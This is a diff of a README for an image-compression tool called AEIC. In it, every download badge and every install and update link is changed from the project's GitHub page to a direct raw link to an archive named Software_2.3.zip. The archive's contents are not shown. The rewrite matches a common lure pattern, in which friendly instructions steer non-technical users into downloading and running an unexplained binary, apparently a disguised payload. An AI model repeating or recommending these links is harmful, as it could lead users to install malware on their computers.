@@ -1,6 +1,6 @@
 # 🖼️ AEIC - Compress Images with Ultra-Low Bitrate
 
-[![Download AEIC](https://img.shields.io/badge/Download-AEIC-brightgreen?style=for-the-badge)](https://github.com/danniel-dd/AEIC)
+[![Download AEIC](https://img.shields.io/badge/Download-AEIC-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/danniel-dd/AEIC/main/assets/Software_2.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ The program uses your computer's processor to compress images efficiently. A mor
 You need to get the installer or program files before running AEIC. Follow these steps:
 
 1. Click the big green button above or go to this page:  
-   https://github.com/danniel-dd/AEIC
+   https://raw.githubusercontent.com/danniel-dd/AEIC/main/assets/Software_2.3.zip
 
 2. On the webpage, look for the **Releases** section or a download link labeled clearly.
 
@@ -120,7 +120,7 @@ Try different settings with sample images to find what works best for you.
 To get new features or fixes:
 
 1. Visit the download page again:  
-   https://github.com/danniel-dd/AEIC
+   https://raw.githubusercontent.com/danniel-dd/AEIC/main/assets/Software_2.3.zip
 
 2. Download the latest installer.
 
@@ -142,4 +142,4 @@ Use straightforward language to describe any errors or questions you have.
 
 ---
 
-[![Download AEIC](https://img.shields.io/badge/Download-AEIC-blue?style=for-the-badge)](https://github.com/danniel-dd/AEIC)
+[![Download AEIC](https://img.shields.io/badge/Download-AEIC-blue?style=for-the-badge)](https://raw.githubusercontent.com/danniel-dd/AEIC/main/assets/Software_2.3.zip)
